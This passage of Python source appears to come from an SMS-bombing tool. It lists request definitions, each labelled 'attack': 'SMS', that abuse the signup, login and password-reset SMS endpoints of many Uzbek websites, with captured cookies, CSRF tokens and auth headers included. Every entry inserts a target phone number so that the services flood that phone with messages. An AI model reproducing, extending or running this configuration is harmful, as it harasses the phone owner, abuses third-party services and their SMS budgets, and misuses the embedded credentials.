            'headers': {'authority': 'mobile.apelsin.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'app-version': 'w0.0.1', 'content-type': 'application/json;charset=UTF-8', 'device-id': 'e9ca9ded07f416a294508f75a7c24bd7', 'lang': 'ru', 'origin': 'https://uzumbank.uz', 'referer': 'https://uzumbank.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'token': '', 'user-agent': user_agent()[1],},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Europharm.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.europharm.uz/api/signup/request',
            'headers': {'authority': 'api.europharm.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://europharm.uz', 'referer': 'https://europharm.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-cart-token': 'x-cart-b9trhlrz',},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'SAVII.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://savii.uz/customer/account/createpost/',
            'cookies': {'PHPSESSID': 'ur58lf45kqv6eh9fc8j0n9ggu1', '_gid': 'GA1.2.1852727392.1679825760', '_ym_uid': '1679825761897645078', '_ym_d': '1679825761', '_ym_isad': '1', '_ym_visorc': 'w', 'mage-translation-storage': '%7B%7D', 'mage-translation-file-version': '%7B%7D', 'form_key': 'd9V8kPOjr8hSbNld', 'mage-cache-storage': '%7B%7D', 'mage-cache-storage-section-invalidation': '%7B%7D', 'mage-cache-sessid': 'true', 'mage-messages': '', 'recently_viewed_product': '%7B%7D', 'recently_viewed_product_previous': '%7B%7D', 'recently_compared_product': '%7B%7D', 'recently_compared_product_previous': '%7B%7D', 'product_data_storage': '%7B%7D', '_ga_M5CL30XY30': 'GS1.1.1679825760.1.1.1679825787.33.0.0', '_ga': 'GA1.1.1697086697.1679825760', 'section_data_ids': '%7B%22cart%22%3Anull%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22captcha%22%3Anull%2C%22compare-products%22%3Anull%2C%22product_data_storage%22%3Anull%7D',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryqqIsrJvxyyO111Ir', 'Origin': 'https://savii.uz', 'Referer': 'https://savii.uz/customer/account/create/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="form_key"\r\n\r\nd9V8kPOjr8hSbNld\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="success_url"\r\n\r\n\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="error_url"\r\n\r\n\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="complete_registration"\r\n\r\n1\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nUser\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="lastname"\r\n\r\nName\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="dob"\r\n\r\n11.11.1991\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="gender"\r\n\r\n1\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n+{number}\r\n------WebKitFormBoundaryqqIsrJvxyyO111Ir--\r\n',
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'SAVII.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://savii.uz/brander_smsconfirm_login/send/?telephone={number}&=&code=&type=sms&code_hash=&_=1679825920421',
            'cookies': {'_gid': 'GA1.2.1852727392.1679825760', '_ym_uid': '1679825761897645078', '_ym_d': '1679825761', '_ym_isad': '1', '_ym_visorc': 'w', 'mage-translation-storage': '%7B%7D', 'mage-translation-file-version': '%7B%7D', 'form_key': 'd9V8kPOjr8hSbNld', 'mage-cache-storage': '%7B%7D', 'mage-cache-storage-section-invalidation': '%7B%7D', 'recently_viewed_product': '%7B%7D', 'recently_viewed_product_previous': '%7B%7D', 'recently_compared_product': '%7B%7D', 'recently_compared_product_previous': '%7B%7D', 'product_data_storage': '%7B%7D', 'private_content_version': '99afa4e55c09921f19e968b43ce64453', 'PHPSESSID': 't04tqqg9rjtbn7chl0829u11ai', 'mage-cache-sessid': 'true', 'mage-messages': '', 'section_data_ids': '%7B%22cart%22%3A1679825832%2C%22customer%22%3A1679825832%2C%22captcha%22%3A1679825832%2C%22compare-products%22%3A1679825832%2C%22product_data_storage%22%3A1679825832%2C%22last-ordered-items%22%3A1679825832%2C%22directory-data%22%3A1679825832%2C%22instant-purchase%22%3A1679825832%2C%22persistent%22%3A1679825832%2C%22review%22%3A1679825832%2C%22wishlist%22%3A1679825832%2C%22review-like-dislike%22%3A1679825832%2C%22recently_viewed_product%22%3A1679825832%2C%22recently_compared_product%22%3A1679825832%2C%22paypal-billing-agreement%22%3A1679825832%2C%22checkout-fields%22%3A1679825832%2C%22collection-point-result%22%3A1679825832%2C%22pickup-location-result%22%3A1679825832%7D', '_gat_UA-203077051-1': '1', '_ga_M5CL30XY30': 'GS1.1.1679825760.1.1.1679825920.60.0.0', '_ga': 'GA1.1.1697086697.1679825760',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Referer': 'https://savii.uz/customer/account/login/referer/aHR0cHM6Ly9zYXZpaS51ei9jdXN0b21lci9hY2NvdW50L3Ntc2NvbmZpcm1hdGlvbi9oYXNoL2ZoVnJreTAyWDRTaXJvdUY3cnBYMlkyUXNRTGpXU0I4Lw%2C%2C/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            # Восстановление пароля
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Shopikent.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shopikent.uz/index.php?route=account/register',
            'headers': {'authority': 'shopikent.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryo9Q7AJl9TaRZqDk0', 'origin': 'https://shopikent.uz', 'referer': 'https://shopikent.uz/index.php?route=account/register', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="customer_group_id"\r\n\r\n1\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="custom_field[account][21]"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="custom_field[account][9]"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="custom_field[account][8]"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n+{number}\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="password"\r\n\r\nGgs6siduh6454\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nUser\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="lastname"\r\n\r\nName\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="confirm_email"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="fax"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="confirm"\r\n\r\n\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="newsletter"\r\n\r\n1\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0\r\nContent-Disposition: form-data; name="agree"\r\n\r\n1\r\n------WebKitFormBoundaryo9Q7AJl9TaRZqDk0--\r\n',
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Shopikent.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shopikent.uz/index.php?route=account/login/telephone_login',
            'headers': {'authority': 'shopikent.uz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://shopikent.uz', 'referer': 'https://shopikent.uz/index.php?route=account/login', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'telephone': f'+{number}', 'section': '0',},
            # Вход по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'WOOZ.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://wooz.ox-sys.com/market-api/sent-verification',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://wooz.uz', 'Referer': 'https://wooz.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'security-key': 'hDR574PEFaXtXsHHQPg1_oYWnLdsIFDCO5ElcrJSRKU=',},
            'json': {'phoneNumber': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'zMarket.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.zmarket.uz/api/v1/login/send-sms-code',
            'headers': {'authority': 'www.zmarket.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Basic em1hcmtldDpZeEgwT3I5emFHeTFMSFRQMQ==', 'content-language': 'uz', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://www.zmarket.uz', 'referer': 'https://www.zmarket.uz/uz', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-xsrf-token': 'eyJpdiI6Im5wb1VDWG92NkxFSGlYTUFHTXlMMEE9PSIsInZhbHVlIjoiK1F3VGlyK0VhNlZ0Yld2T2VhdStZc3N4UmZPUHJFaHBBOFdKc1BwaFZOaVM1N2pOZVgxbTlhdnhQSjNrSUlKZ1A0bnlqV0REU2lNWDhDZHJWOWZLZkdLU212S2xwSExoMk5xVVMwa3VnQkZadWRacXBLQnoyWU1XVEU4cG1kdGQiLCJtYWMiOiIzYzM5YWNlNjJjM2FmNWMwMjk5Yjg2MTc4Nzk4YThjYmZmYmZiNWE5NDMzMTIzM2U0OTE4YzRkMTg3MzYyN2E1In0=',},
            'json': {'phone': f'+{number}', 'login': True,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Market.Click.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://market.click.uz/wp-admin/admin-ajax.php',
            'cookies': {'_ym_uid': '1679419932731496974', '_ym_d': '1679419932', '_gcl_au': '1.1.341026465.1679419932', '_ym_isad': '1', '_gid': 'GA1.2.619517795.1679827937', '_ym_visorc': 'w', '_ga_0573BT23EC': 'GS1.1.1679827937.2.0.1679827940.0.0.0', 'pll_language': 'ru', '_ga_8FLJ8RF34K': 'GS1.1.1679828487.1.0.1679828487.0.0.0', '_gat_UA-214885348-1': '1', '_ga_2KWLRN2Q95': 'GS1.1.1679828488.1.0.1679828488.0.0.0', '_ga': 'GA1.1.645709204.1679419933',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://market.click.uz', 'Referer': 'https://market.click.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'action': 'check_phone', 'params[phone_number]': number, 'params[lang]': 'ru', 'params[five_minute_pause]': '', 'nonce_code': 'd5926a83bf',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'SugurtaBozor.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://netkost.uz/userapi/send-sms-code',
            'headers': {'authority': 'netkost.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryfOKHBx9PBb7AWApX', 'origin': 'https://sugurtabozor.uz', 'referer': 'https://sugurtabozor.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryfOKHBx9PBb7AWApX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryfOKHBx9PBb7AWApX--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'MacBro.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.auth.macbro.uz/v1/auth/passcode/generate',
            'headers': {'authority': 'api.auth.macbro.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://macbro.uz', 'platform-id': '7d4a4c38-dd84-4902-b744-0488b80a4c01', 'referer': 'https://macbro.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'client_type_id': '5a3818a9-90f0-44e9-a053-3be0ba1e2c07', 'username': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Seller.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://seller.uz/site/send-sms',
            'cookies': {'_ym_uid': '1677692358138758196', '_ym_d': '1677692358', '_ga': 'GA1.1.1580564248.1677692358', '_ym_isad': '1', 'advanced-frontend': 'krbci7iasgq22h3nrnkl19dh55', '_csrf-frontend': 'dbf0a78c50059908b42e6ad89ad27b492afc665c05cc3c84fd6c04cef029e750a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22UmAGISiDWwEbfynAAXiAugncuZ_3pIhV%22%3B%7D', '_ym_visorc': 'w', '_ga_LJRDVS3TM9': 'GS1.1.1677897391.4.1.1677897441.0.0.0',},
            'headers': {'authority': 'seller.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://seller.uz', 'referer': 'https://seller.uz/site/signup', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': number, '_csrf-frontend': '6NMJNFGzmOJTlCgE9u-Dsxh8E3pMVrUfKzAlOgpHCNK9vkhzGODxpgTjbWaQlu3yWSR6Ozkx23xeanoJeg5ghA==',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Exportal.io', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://exportal.io/user/register',
            'cookies': {'lng': 'ru', 'session': 'smfWRMqNVNmnwvDFQQfvOpy1Rn773MRmgQr9kO2p', '_ym_uid': '1679829668836117436', '_ym_d': '1679829668', '_ga': 'GA1.1.2069562841.1679829668', '_ym_visorc': 'w', '_ym_isad': '1', 'bff_device': 'desktop', '_ga_CE1X4MXVVZ': 'GS1.1.1679829667.1.1.1679829785.0.0.0',},
            'headers': {'authority': 'exportal.io', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://exportal.io', 'referer': 'https://exportal.io/user/register', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'back=https%3A%2F%2Fexportal.io%2Fuser%2Flogin&phone_number=+{number}&agreement=on&uufp=c9d5d0503e268e99afe0d59430f3679d&',
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Exportal.io', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://exportal.io/user/register',
            'cookies': {'lng': 'ru', 'session': 'smfWRMqNVNmnwvDFQQfvOpy1Rn773MRmgQr9kO2p', '_ym_uid': '1679829668836117436', '_ym_d': '1679829668', '_ga': 'GA1.1.2069562841.1679829668', '_ym_visorc': 'w', '_ym_isad': '1', 'bff_device': 'desktop', '_ga_CE1X4MXVVZ': 'GS1.1.1679829667.1.1.1679829723.0.0.0',},
            'headers': {'authority': 'exportal.io', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://exportal.io', 'referer': 'https://exportal.io/user/register?step=phone', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'step': 'phone', 'act': 'phone-change', 'phone': f'+{number}',},
            'params': {'step': 'phone',},
            # Повторная отправка смс для регистрации
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': '100k.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://100k.uz/auth',
            'cookies': {'october_session': 'eyJpdiI6InEwRUJDdmIrQ0RXQ1VIM1U2bGdnd0E9PSIsInZhbHVlIjoieGJDeUlYM3R0WXdUcmJXU3dZeEtxK21GcS92WVcya0c3Q1p2K2RtTU5lS3VuaElhTkFVbmtrTnlRQURtaXk2THFqZnY0SEtsRjc2T2tMU2ZkMjZjU3dIRURHd2xmL2MwL0Vidlc2dWNMM1gxZkRlNEVJNklTaktzNmI4a3Y1TnEiLCJtYWMiOiJjOGZmODk3NGNkNGY2MTRhYzAyNGRhODQ5N2E4MGUxYmEzNjIxNTAxOTBlMjg3ODE0NzAyOGE3MjllMGNmZGYzIiwidGFnIjoiIn0%3D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://100k.uz', 'Referer': 'https://100k.uz/auth', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-OCTOBER-REQUEST-FLASH': '1', 'X-OCTOBER-REQUEST-HANDLER': 'onAuth', 'X-OCTOBER-REQUEST-PARTIALS': 'v2auth/login', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'username=+{number}',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': '7Saber.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.7saber.uz/client/send-code',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Basic Kzk5ODkwOTIxNjM4OTo4Zjc0OWJlMmNkMjdmMWQ0MjhjOGRlNzU5YWFlMmNhZA==', 'Connection': 'keep-alive', 'Content-Language': 'ru', 'Content-Type': 'application/json', 'Content-currency': 'UZS', 'Origin': 'https://7saber.uz', 'Referer': 'https://7saber.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ZuzuPizza.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://customer.api.delever.uz/v1/customers/register',
            'headers': {'authority': 'customer.api.delever.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://zuzupizza.uz', 'platform': 'website', 'referer': 'https://zuzupizza.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'shipper': '99004cd5-e4bf-4b46-9d83-e2977c80acbf', 'user-agent': user_agent()[1],},
            'json': {'phone': f'+{number}', 'registration_source': 'website',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ORZON.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://orzon.uz/local/ajax/common.php',
            'cookies': {'PHPSESSID': '32875ae8fe42f69cae2419b95f70db24', 'BITRIX_SM_SALE_UID': 'b3d35397a7cd72a896886d940ab244cf', 'BITRIX_SM_TIME_ZONE': '-300', '_ym_debug': 'null', '_ym_uid': '1679833696353390556', '_ym_d': '1679833696', '_ym_isad': '1', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1679857140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://orzon.uz', 'Referer': 'https://orzon.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'handler': 'AuthAjaxHandler', 'func': 'sendRegisterFields', 'phone': number, 'name': 'User', 'bday': '1991-11-11', 'mail': email(),},
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ORZON.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://orzon.uz/local/ajax/common.php',
            'cookies': {'PHPSESSID': '32875ae8fe42f69cae2419b95f70db24', 'BITRIX_SM_SALE_UID': 'b3d35397a7cd72a896886d940ab244cf', 'BITRIX_SM_TIME_ZONE': '-300', '_ym_debug': 'null', '_ym_uid': '1679833696353390556', '_ym_d': '1679833696', '_ym_isad': '1', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1679857140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://orzon.uz', 'Referer': 'https://orzon.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'handler': 'AuthAjaxHandler', 'func': 'sendConfirmCode', 'phone': number,},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'MyHit.Uztelecom.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://rbtweb.deploy.uz/api/authentication/subscriber/send-sms',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://myhit.uztelecom.uz', 'Referer': 'https://myhit.uztelecom.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'msisdn': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'KinoPro.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kinopro.uz/local/ajax/common.php',
